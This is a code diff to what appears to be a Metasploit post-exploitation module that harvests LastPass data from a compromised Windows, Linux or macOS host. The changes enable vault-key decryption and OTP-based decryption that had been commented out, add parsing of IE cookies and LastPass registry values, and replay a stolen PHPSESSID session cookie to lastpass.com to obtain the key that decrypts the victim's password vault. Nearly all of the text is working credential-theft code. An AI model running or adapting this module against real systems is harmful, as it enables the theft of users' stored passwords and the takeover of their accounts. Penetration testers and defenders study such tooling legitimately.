@@ -23,7 +23,7 @@ class Metasploit3 < Msf::Post
           'Jon Hart <jon_hart[at]rapid7.com' # module rework and cleanup
         ],
         'Platform' => %w(linux osx unix win),
-        'References'   => [['URL', 'http://www.martinvigo.com/a-look-into-lastpass/']],
+        'References'   => [['URL', 'http://www.martinvigo.com/even-the-lastpass-will-be-stolen-deal-with-it']],
         'SessionTypes' => %w(meterpreter shell)
       )
     )
@@ -58,7 +58,6 @@ class Metasploit3 < Msf::Post
     print_lastpass_data(account_map)
   end
 
-
   # Returns a mapping of lastpass accounts
   def build_account_map
     platform = session.platform
@@ -77,22 +76,19 @@ class Metasploit3 < Msf::Post
           'Chrome' => "#{user_profile['LocalAppData']}\\Google\\Chrome\\User Data\\Default\\databases\\chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0",
           'Firefox' => "#{user_profile['AppData']}\\Mozilla\\Firefox\\Profiles",
           'IE' => "#{user_profile['LocalAppData']}Low\\LastPass",
-          'Opera' => "#{user_profile['AppData']}\\Opera Software\\Opera Stable\\databases\\chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0",
-          'Safari' => "#{user_profile['LocalAppData']}\\Apple Computer\\Safari\\Databases\\safari-extension_com.lastpass.lpsafariextension-n24rep3bmn_0"
+          'Opera' => "#{user_profile['AppData']}\\Opera Software\\Opera Stable\\databases\\chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0"
         }
         localstorage_path_map = {
           'Chrome' => "#{user_profile['LocalAppData']}\\Google\\Chrome\\User Data\\Default\\Local Storage\\chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0.localstorage",
           'Firefox' => "#{user_profile['LocalAppData']}Low\\LastPass",
           'IE' => "#{user_profile['LocalAppData']}Low\\LastPass",
-          'Opera' => "#{user_profile['AppData']}\\Opera Software\\Opera Stable\\Local Storage\\chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0.localstorage",
-          'Safari' => "#{user_profile['LocalAppData']}\\Apple Computer\\Safari\\LocalStorage\\safari-extension_com.lastpass.lpsafariextension-n24rep3bmn_0.localstorage"
+          'Opera' => "#{user_profile['AppData']}\\Opera Software\\Opera Stable\\Local Storage\\chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0.localstorage"
         }
         cookies_path_map = {
           'Chrome' => "#{user_profile['LocalAppData']}\\Google\\Chrome\\User Data\\Default\\Cookies",
           'Firefox' => "", # It's set programmatically
           'IE' => "#{user_profile['LocalAppData']}\\Microsoft\\Windows\\INetCookies\\Low",
-          'Opera' => "#{user_profile['AppData']}\\Opera Software\\Opera Stable\\Cookies",
-          'Safari' => ""
+          'Opera' => "#{user_profile['AppData']}\\Opera Software\\Opera Stable\\Cookies"
         }
       when /unix|linux/
         browser_path_map = {
@@ -108,8 +104,7 @@ class Metasploit3 < Msf::Post
         cookies_path_map = { #TODO
           'Chrome' => "",
           'Firefox' => "",
-          'Opera' => "",
-          'Safari' => ""
+          'Opera' => ""
         }
       when /osx/
         browser_path_map = {
@@ -143,11 +138,11 @@ class Metasploit3 < Msf::Post
           if session.type == "meterpreter"
             account_map[account][browser]['localstorage_db'] = localstorage_path_map[browser] if client.fs.file.exists?(localstorage_path_map[browser]) || browser.match(/Firefox|IE/)
             account_map[account][browser]['cookies_db'] = cookies_path_map[browser] if client.fs.file.exists?(cookies_path_map[browser]) || browser.match(/Firefox|IE/)
-            #account_map[account][browser]['cookies_db'] = cookies_path_map[browser]['lp_db_path'].gsub("prefs.js", "cookies.sqlite") if client.fs.file.exists?(cookies_path_map[browser]['lp_db_path']) && browser == 'Firefox'
+            account_map[account][browser]['cookies_db'] = account_map[account][browser]['lp_db_path'].first.gsub("prefs.js", "cookies.sqlite") if (!account_map[account][browser]['lp_db_path'].blank? && browser == 'Firefox')
           else # session.type == "shell"
             account_map[account][browser]['localstorage_db'] = localstorage_path_map[browser] if session.shell_command("ls \"#{localstorage_path_map[browser]}\"").strip == localstorage_path_map[browser].strip || browser.match(/Firefox|IE/)
             account_map[account][browser]['cookies_db'] = cookies_path_map[browser] if session.shell_command("ls \"#{cookies_path_map[browser]}\"").strip == cookies_path_map[browser].strip || browser.match(/Firefox|IE/)
-            #account_map[account][browser]['cookies_db'] = cookies_path_map[browser]['lp_db_path'] if session.shell_command("ls \"#{cookies_path_map[browser]['lp_db_path']}\"").strip == cookies_path_map[browser]['lp_db_path'].strip && browser == 'Firefox'
+            account_map[account][browser]['cookies_db'] = account_map[account][browser]['lp_db_path'].first.gsub("prefs.js", "cookies.sqlite") if (session.shell_command("ls \"#{account_map[account][browser]['lp_db_path']}\"").strip == account_map[account][browser]['lp_db_path'].strip && browser == 'Firefox')
           end
         else
           account_map[account].delete(browser)
@@ -164,13 +159,9 @@ class Metasploit3 < Msf::Post
 
     vprint_status "Checking #{account}'s #{browser}"
     if browser == "IE" # Special case for IE
-      root_key, base_key = session.sys.registry.splitkey('HKEY_CURRENT_USER\Software\AppDataLow\Software\LastPass')
-      reg_key = session.sys.registry.open_key(root_key, base_key, KEY_READ)
-      return [] if not reg_key
-      reg_value = reg_key.query_value("LoginUsers")
-      return [] if not reg_value
-      paths |= ['HKEY_CURRENT_USER\Software\AppDataLow\Software\LastPass'] if !reg_value.data.blank? && path != "Low\\LastPass" # Hacky way to detect if there is access to user's data (attacker has no root access)
-      reg_key.close
+      data = read_registry_key_value('HKEY_CURRENT_USER\Software\LastPass', "LoginUsers")
+      data = read_registry_key_value('HKEY_CURRENT_USER\Software\AppDataLow\Software\LastPass', "LoginUsers") if data.blank?
+      paths |= ['HKEY_CURRENT_USER\Software\AppDataLow\Software\LastPass'] if !data.blank? && path != "Low\\LastPass" # Hacky way to detect if there is access to user's data (attacker has no root access)
     elsif browser == "Firefox" # Special case for Firefox
       paths |= firefox_profile_files(path, browser)
     else
@@ -262,28 +253,24 @@ class Metasploit3 < Msf::Post
     [found_dbs_paths]
   end
 
-
-
   # Parses the Firefox preferences file and returns encoded credentials
   def ie_firefox_credentials(prefs_path, localstorage_db_path)
     credentials = []
     data = nil
 
     if(prefs_path == nil) # IE
-      root_key, base_key = session.sys.registry.splitkey('HKEY_CURRENT_USER\Software\AppDataLow\Software\LastPass')
-      reg_key = session.sys.registry.open_key(root_key, base_key, KEY_READ)
-      return [] if not reg_key
-      reg_value = reg_key.query_value("LoginUsers")
-      return [] if not reg_value
-      usernames = reg_value.data.split("|")
+      data = read_registry_key_value('HKEY_CURRENT_USER\Software\AppDataLow\Software\LastPass', "LoginUsers")
+      data = read_registry_key_value('HKEY_CURRENT_USER\Software\LastPass', "LoginUsers") if data.blank?
+      return [] if data.blank?
+
+      usernames = data.split("|")
       usernames.each do |username|
         credentials << [username, nil]
       end
       
       # Extract master passwords
-      reg_value = reg_key.query_value("LoginPws")
-      data = Base64.encode64(reg_value.data) if reg_value
-      reg_key.close
+      data = read_registry_key_value('HKEY_CURRENT_USER\Software\AppDataLow\Software\LastPass', "LoginPws")
+      data = Base64.encode64(data) if !data.blank?
     else # Firefox
       loot_path = loot_file(prefs_path, nil, 'firefox.preferences', "text/javascript", "Firefox preferences file")
       return [] if !loot_path
@@ -344,7 +331,7 @@ class Metasploit3 < Msf::Post
         if browser.match(/Firefox|IE/)
           if browser == "Firefox"
             ieffcreds = ie_firefox_credentials(lp_data['lp_db_path'].first, lp_data['localstorage_db'])
-          else
+          else # IE
             ieffcreds = ie_firefox_credentials(nil, lp_data['localstorage_db'])
           end
           unless ieffcreds.blank?
@@ -437,16 +424,16 @@ class Metasploit3 < Msf::Post
           if browser.match(/Firefox|IE/)
             if browser == "Firefox"
               iterations_path = lp_data['localstorage_db'] + client.fs.file.separator + OpenSSL::Digest::SHA256.hexdigest(username) + "_key.itr"
+              vault_path = lp_data['localstorage_db'] + client.fs.file.separator + OpenSSL::Digest::SHA256.hexdigest(username) + "_lps.act.sxml"
             else # IE
               iterations_path = lp_data['localstorage_db'] + client.fs.file.separator + OpenSSL::Digest::SHA256.hexdigest(username) + "_key_ie.itr"
+              vault_path = lp_data['localstorage_db'] + client.fs.file.separator + OpenSSL::Digest::SHA256.hexdigest(username) + "_lps.sxml"
             end
             iterations = read_remote_file(iterations_path) if client.fs.file.exists?(iterations_path) # Read file if it exists
             iterations = nil if iterations.blank? # Verify content
             lp_data['lp_creds'][username]['iterations'] = iterations
 
             # Find encrypted vault
-            vault_path = lp_data['localstorage_db'] + client.fs.file.separator + OpenSSL::Digest::SHA256.hexdigest(username) + "_lps.act.sxml"
-            vault_path = lp_data['localstorage_db'] + client.fs.file.separator + OpenSSL::Digest::SHA256.hexdigest(username) + "_lps.sxml" if !client.fs.file.exists?(vault_path)
             vault = read_remote_file(vault_path)
             vault = windows_unprotect(vault) if vault != nil && vault.match(/^AQAAA.+/) # Verify Windows protection
             vault = vault.sub(/iterations=.*;/, "") if client.fs.file.exists?(vault_path) # Remove iterations info
@@ -487,12 +474,13 @@ class Metasploit3 < Msf::Post
             lp_data['lp_creds'][username]['vault_key'] = derive_vault_key_from_creds(username, lp_data['lp_creds'][username]['lp_password'], user_data['iterations'])
           else # Get vault key decrypting the locally stored one or from the disabled OTP
             if !browser_checked
-              ##decrypt_local_vault_key(account, browser_map) 
+              decrypt_local_vault_key(account, browser_map) 
               browser_checked = true
             end
             if lp_data['lp_creds'][username]['vault_key'] == nil # If no vault key was found yet, try with dOTP
-              ##otpbin = extract_otpbin(account, browser, username, lp_data)
-              ##lp_data['lp_creds'][username]['vault_key'] = decrypt_vault_key_with_otp(username, otpbin)
+              otpbin = extract_otpbin(account, browser, username, lp_data)
+              otpbin.blank? ? next : otpbin = otpbin[0..31]
+              lp_data['lp_creds'][username]['vault_key'] = decrypt_vault_key_with_otp(username, otpbin)
             end
           end
         end
@@ -502,7 +490,27 @@ class Metasploit3 < Msf::Post
 
   # Decrypt the locally stored vault key
   def decrypt_local_vault_key account, browser_map
-      browser_map.each_pair do |browser, lp_data|
+    data = nil
+    session_cookie_value = nil
+
+    browser_map.each_pair do |browser, lp_data|
+      if browser == "IE"
+        if session.type == "meterpreter"
+          cookies_files = client.fs.dir.entries(lp_data['cookies_db'])
+        else
+          cookies_files = session.shell_command("ls #{lp_data['cookies_db']}").split
+        end
+        cookies_files.reject! { |u| %w(. ..).include?(u) }
+        cookies_files.each do |cookie_jar_file|
+          data = read_remote_file(lp_data['cookies_db'] + client.fs.file.separator + cookie_jar_file)
+          next if data.blank?
+          if /.*PHPSESSID.(?<session_cookie_value_match>.*?).lastpass\.com?/m =~ data # Find the session id
+            loot_path = loot_file(lp_data['cookies_db'] + client.fs.file.separator + cookie_jar_file, nil, "#{browser.downcase}.lastpass.cookies", "text/plain", "#{account}'s #{browser} cookies DB")
+            session_cookie_value = session_cookie_value_match
+            break
+          end
+        end
+      else
         case browser
         when /Chrome/
           query = "SELECT encrypted_value FROM cookies WHERE host_key = 'lastpass.com' AND name = 'PHPSESSID'"
@@ -516,9 +524,10 @@ class Metasploit3 < Msf::Post
           query = nil
           print_error "Browser #{browser} not recognized"
         end
-        loot_path = loot_file(lp_data['cookies_db'], nil, "#{browser.downcase}.lastpass.cookies", "application/x-sqlite3", "#{account}'s #{browser} cookies DB")
 
         # Parsing/Querying the DB
+        loot_path = loot_file(lp_data['cookies_db'], nil, "#{browser.downcase}.lastpass.cookies", "application/x-sqlite3", "#{account}'s #{browser} cookies DB")
+        next if loot_path.blank?
         db = SQLite3::Database.new(loot_path)
         begin
           result = db.execute(query)
@@ -527,37 +536,39 @@ class Metasploit3 < Msf::Post
           next
         end
         next if result.blank? # No session cookie found for this browser
-        session_cookie = windows_unprotect(Base64.encode64(result[0][0])) # TODO: Support other browsers/OSs
-
-        # Use the cookie to obtain the encryption key to decrypt the vault key
-        uri = URI('https://lastpass.com/login_check.php')
-        request = Net::HTTP::Post.new(uri)
-        request.set_form_data("wxsessid" => URI.unescape(session_cookie),"uuid" => browser_map['lp_2fa'])
-        request.content_type = 'application/x-www-form-urlencoded; charset=UTF-8'
-        response = Net::HTTP.start(uri.hostname, uri.port, :use_ssl => true) { |http| http.request(request) }
-
-        # Parse response
-        next if !response.body.match(/pwdeckey\="([a-z0-9]+)"/) # Session must have expired
-        decryption_key = OpenSSL::Digest::SHA256.hexdigest(response.body.match(/pwdeckey\="([a-z0-9]+)"/)[1])
-        username = response.body.match(/lpusername="([A-Za-z0-9._%+-@]+)"/)[1]
-
-        # Get the local encrypted vault key
-        db = SQLite3::Database.new(lp_data['lp_db_loot'])
-        result = db.execute(
-          "SELECT data FROM LastPassData " \
-          "WHERE username_hash = '"+OpenSSL::Digest::SHA256.hexdigest(username)+"' AND type = 'key'"
-        )
-        encrypted_vault_key = result[0][0].split("\n")[0]
-
-        # Decrypt the local stored key
-        lp_data['lp_creds'][username]['vault_key'] = decrypt_data([decryption_key].pack("H*"), encrypted_vault_key)
+        session_cookie_value = result[0][0]
       end
+      session_cookie_value = windows_unprotect(Base64.encode64(session_cookie_value)) if (session_cookie_value != nil && Base64.encode64(session_cookie_value).match(/^AQAAA.+/))
+      return if session_cookie_value.blank?
+
+      # Use the cookie to obtain the encryption key to decrypt the vault key
+      uri = URI('https://lastpass.com/login_check.php')
+      request = Net::HTTP::Post.new(uri)
+      request.set_form_data("wxsessid" => URI.unescape(session_cookie_value),"uuid" => browser_map['lp_2fa'])
+      request.content_type = 'application/x-www-form-urlencoded; charset=UTF-8'
+      response = Net::HTTP.start(uri.hostname, uri.port, :use_ssl => true) { |http| http.request(request) }
+
+      # Parse response
+      next if !response.body.match(/pwdeckey\="([a-z0-9]+)"/) # Session must have expired
+      decryption_key = OpenSSL::Digest::SHA256.hexdigest(response.body.match(/pwdeckey\="([a-z0-9]+)"/)[1])
+      username = response.body.match(/lpusername="([A-Za-z0-9._%+-@]+)"/)[1]
+
+      # Get the local encrypted vault key
+      encrypted_vault_key = extract_local_encrypted_vault_key(browser, username, lp_data)
+
+      # Decrypt the local stored key
+      lp_data['lp_creds'][username]['vault_key'] = decrypt_data([decryption_key].pack("H*"), encrypted_vault_key)
+    end
   end
 
   # Returns otp, encrypted_key
   def extract_otpbin(account, browser, username, lp_data)    
-    if browser == 'Firefox'
-      path = lp_data['localstorage_db'] + client.fs.file.separator + OpenSSL::Digest::SHA256.hexdigest(username) + "_ff.sotp"
+    if browser.match(/Firefox|IE/)
+      if browser == "Firefox"
+        path = lp_data['localstorage_db'] + client.fs.file.separator + OpenSSL::Digest::SHA256.hexdigest(username) + "_ff.sotp"
+      else # IE
+        path = lp_data['localstorage_db'] + client.fs.file.separator + OpenSSL::Digest::SHA256.hexdigest(username) + ".sotp"
+      end
       otpbin = read_remote_file(path) if client.fs.file.exists?(path) #Read file if it exists
       otpbin = windows_unprotect(otpbin) if otpbin != nil && otpbin.match(/^AQAAA.+/)
       return otpbin
@@ -603,7 +614,6 @@ class Metasploit3 < Msf::Post
     if response.body.match(/randkey\="(.*)"/)
       encrypted_vault_key = response.body.match(/randkey\="(.*)"/)[1]
     end
-
     encrypted_vault_key
   end
 
@@ -755,7 +765,6 @@ class Metasploit3 < Msf::Post
     loot_path
   end
 
-
   # Reads a remote file and returns the data
   def read_remote_file(path)
     data = nil
@@ -763,9 +772,41 @@ class Metasploit3 < Msf::Post
     begin
       data = read_file(path)
     rescue EOFError
-      vprint_error "File #{path} is empty"
+      vprint_error "Error reading file #{path} It could be empty"
     end
     data
+  end
+
+  def read_registry_key_value(key, value)
+    begin
+      root_key, base_key = session.sys.registry.splitkey(key)
+      reg_key = session.sys.registry.open_key(root_key, base_key, KEY_READ)
+      return nil if not reg_key
+      reg_value = reg_key.query_value(value)
+      return nil if not reg_value
+    rescue
+      vprint_error "Error reading registry key #{key} and value #{value}"
+    end
+    reg_key.close if reg_key
+    return reg_value.blank? ? nil : reg_value.data
+  end
+
+  def extract_local_encrypted_vault_key(browser, username, lp_data)
+    if browser.match(/Firefox|IE/)
+      encrypted_key_path = lp_data['localstorage_db'] + client.fs.file.separator + OpenSSL::Digest::SHA256.hexdigest(username) + "_lpall.slps"
+      encrypted_vault_key = read_remote_file(encrypted_key_path)
+      encrypted_vault_key = windows_unprotect(encrypted_vault_key) if encrypted_vault_key != nil && encrypted_vault_key.match(/^AQAAA.+/) # Verify Windows protection
+              
+    else
+      db = SQLite3::Database.new(lp_data['lp_db_loot'])
+      result = db.execute(
+        "SELECT data FROM LastPassData " \
+        "WHERE username_hash = '"+OpenSSL::Digest::SHA256.hexdigest(username)+"' AND type = 'key'"
+      )
+      encrypted_vault_key = result[0][0]
+    end
+
+    return encrypted_vault_key.blank? ? nil : encrypted_vault_key.split("\n")[0] # Return only the key, not the "lastpass rocks" part
   end
 
 end
